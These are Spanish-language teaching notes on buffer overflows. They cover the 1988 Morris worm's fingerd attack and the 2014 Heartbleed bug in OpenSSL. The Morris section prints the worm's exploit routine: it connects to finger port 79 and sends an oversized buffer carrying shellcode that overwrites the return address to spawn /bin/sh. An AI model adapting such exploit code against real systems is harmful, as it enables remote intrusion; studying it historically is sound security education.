# Ejemplos de BufferOverflow
---
## Morris worm fingerd attack

• Noviembre de 1988: Aparece el gusano Morris y en cuestión de horas más de 6000 computadoras se ven afectadas, lo que en ese momento representaba el 10% de Internet.
• El gusano utilizó múltiples métodos de infiltración, siendo el más exitoso un exploit de desbordamiento de búfer en fingerd.
• También intentó ataques a través de sendmail y adivinación de contraseñas a partir de una lista fija.
• El demonio finger de BSD responde a solicitudes entrantes leyendo datos (usualmente un identificador de usuario) en un búfer y transmitiendo de vuelta la información del finger.
• El búfer tenía una longitud de 512 bytes, estaba asignado en la pila y se llenaba utilizando gets:
```
char buffer[512];
gets(buffer);
```
• Una solicitud maliciosa sobrescribe la dirección de retorno en la pila para apuntar dentro del búfer, que contiene código para ejecutar /bin/sh

En la mayoría de los sistemas, fingerd se ejecutaba como root.

#### Código:
```
static try_finger( struct hst *host, int *fd1, int *fd2)
{
int i, j, l12, l16, s;
struct sockaddr_in sin;
char unused[492];
int l552, l556, l560, l564, l568;
char buf[536];
int (*save_sighand)();
save_sighand = signal(SIGALRM, justreturn);
for (i = 0; i < 6; i++) {
if (host->o48[i] == 0)
continue;
s = socket(AF_INET, SOCK_STREAM, 0);
if (s < 0)
continue;
bzero(&sin, sizeof(sin));
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = host->o48[i];
sin.sin_port = IPPORT_FINGER;
alarm(10);
if (connect(s, &sin, sizeof(sin)) < 0) {
alarm(0);
close(s);
continue;
}
alarm(0);
break;
}
if (i >= 6)
return 0;
for(i = 0; i < 536; i++)
buf[i] = '\0';
for(i = 0; i < 400; i++)
buf[i] = 1;
for(j = 0; j < 28; j++)
buf[i+j] =
"\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335
\003\320^\\\274;\344\371\344\342\241\256\343\350\357\
256\362\351"[j];
l556 = 0x7fffe9fc;
/* Rewrite part of the stack
frame */
l560 = 0x7fffe8a8;
l564 = 0x7fffe8bc;
l568 = 0x28000000;
l552 = 0x0001c020;
write(s, buf, sizeof(buf));
/* sizeof == 536 */
write(s, XS("\n"), 1);
sleep(5);
if (test_connection(s, s, 10)) {
*fd1 = s;
*fd2 = s;
return 1;
}
close(s);
return 0;
}
```

Crear descriptor de socket
Intentar conectarse al objetivo en el puerto finger (79)
Abortar si la conexión no se devuelve después de 10 segundos utilizando SIGALRM.

Llenar el búfer con datos para sobrescribir la dirección de retorno y código para llamar a execl(“/bin/sh”);
Nota: buf es un arreglo de 536 bytes, mientras que fingerd solo asigna 512 bytes.
Transmitir buf al objetivo
Probar si la intrusión fue exitosa.

https://www.cs.cmu.edu/afs/cs/academic/class/15213-s02/www/applications/recitation/recitation4/A/r04-A-4up.pdf

## Heartbleed
¿Qué es Heartbleed?
Heartbleed es una vulnerabilidad en OpenSSL que salió a la luz en abril de 2014; estaba presente en miles de servidores web, incluyendo aquellos que ejecutan sitios importantes como Yahoo.

OpenSSL es una biblioteca de código abierto que implementa los protocolos de Seguridad de la Capa de Transporte (TLS) y Capa de Conexión Segura (SSL). La vulnerabilidad significaba que un usuario malicioso podía engañar fácilmente a un servidor web vulnerable para que enviara información sensible, incluyendo nombres de usuario y contraseñas.

Los estándares TLS/SSL son cruciales para la encriptación web moderna, y aunque el fallo estaba en la implementación de OpenSSL y no en los estándares en sí, OpenSSL es tan ampliamente utilizado—cuando se hizo público el error, afectó al 17% de todos los servidores SSL—que precipitó una crisis de seguridad.

Una sola línea de código contiene el error que dio lugar a la vulnerabilidad Heartbleed:
```
memcpy(bp, pl, payload);
```

memcpy() es el comando que copia datos. bp es el lugar al que se están copiando, pl es de donde se copian, y payload es la longitud de los datos que se están copiando. Como hemos visto, el problema es que nunca se intenta verificar si la cantidad de datos en pl es igual al valor dado de payload.

https://www.csoonline.com/article/562859/the-heartbleed-bug-how-a-flaw-in-openssl-caused-a-security-crisis.html


